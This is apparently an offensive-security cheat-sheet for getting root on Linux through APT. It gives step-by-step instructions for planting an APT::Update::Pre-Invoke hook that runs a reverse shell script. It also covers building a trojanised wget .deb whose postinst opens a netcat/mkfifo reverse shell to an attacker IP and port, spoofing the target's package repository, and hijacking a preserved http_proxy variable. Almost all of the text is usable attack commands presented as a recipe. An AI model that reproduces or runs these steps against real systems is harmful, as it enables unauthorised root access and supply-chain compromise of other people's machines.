# APT manager and malicious repository

## Requirements: Possibly a crontab that runs apt as root or the user can run apt/apt-get runs as root with sudo. World-writeable /etc/apt/apt.conf.d

### Steps:

#### 1) Create a malicious config file (pwnapt) that calls your reverse shell script

    APT::Update::Pre-Invoke {"/bin/bash /tmp/pwn.sh"} 

#### 2) Create a reverse shell file (pwn.sh)

#### 3) Upload the config file to the /etc/apt/apt.conf.d/00pwn via any method you can (FTP,tftp,etc)

#### 4) Setup listener

#### 5) GG!

### BONUS!

### Apt configuration files directory: /etc/apt/sources.list.d/ (Check for any files that might contain places that are package repositories for the package manager to pull from)

## Setting up a malicious repository

### Requirements: Trace down where the apt manager of the target machine installs its packages from by checking out the /etc/apt/sources.list/ directory. Also choose a package which is already present on the target machine (wget for example).

### TIP: In sudo configurations (sudo -l) if the http_proxy environment variable is kept while the command is executed as root, before doing the required setup, we can also do: export http_proxy="http://OUR_PROXY:8000" (The proxy is the one we open if we detect this env variable to force the package manager to use our repository) Run the proxy first, then run a simple python3 server and then check if your server receives any requests.

### Steps:

#### 1) 

    mkdir build

#### 2) 

    mkdir -p wget/DEBIAN

#### 3) 

    nano/vim wget/DEBIAN/control (Create the control file with the metadata)

#### Control file contents

    Package: wget

    Architecture: all

    Maintainer: @WHATEVER

    Priority: optional

    Version: 5.0

    Description: GGEZ!

#### 4) 

    mkdir -p wget/usr/bin

#### 5) 

    nano/vim wget/usr/bin/wget (Make a dummy binary)

#### Dummy binary contents 

    #!/bin/bash

    echo "Whatever"

#### 6) 

    chmod 700 wget/usr/bin/mypackage

#### 7) 

    nano/vim wget/DEBIAN/postinst (Create the malicious script)

#### Malicious script (postinst) contents

    #!/bin/bash

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc OUR_IP PORT

#### 8) 

    chmod 755 wget/DEBIAN/postinst

#### 9) 

    dpkg-deb --build wget/ (Package it)

#### 10) Create a file named "Packages" with the contents:

    Package: wget

    Version: 5.0

    Maintainer: WHATEVER

    Architecture: all

    Description: Pwnie package

    Multi-Arch: foreign

    Filename: pwn/wget.deb

    Size: 800

    MD5sum: e5c858d924abbe4effcd1fe1ca4eb21a

    SHA1: 6822716507fe71737c635995f3f8f049d8b3cdf9

    SHA256: 76a31c4e20bf4530027004bf7794b9c7993960d51933ce772b1594d4fc74aca5

### (You can gain the hashes for the .deb file with the md5sum, sha256sum and sha1sum respectively and the size can be gained with ls -la)

#### 11) Finish the setup using gzip

#### 12) Create the directories by replicating the repository we want to spoof with the purpose of the target apt manager downloads the package from our repository instead. Place your package in the right folder according to use case. 

#### 13) Run sudo apt-get update and sudo apt-get upgrade on target machine to download our malicious packages file.

#### 14) If the package has been downloaded, press yes to install it

#### 15) GG!
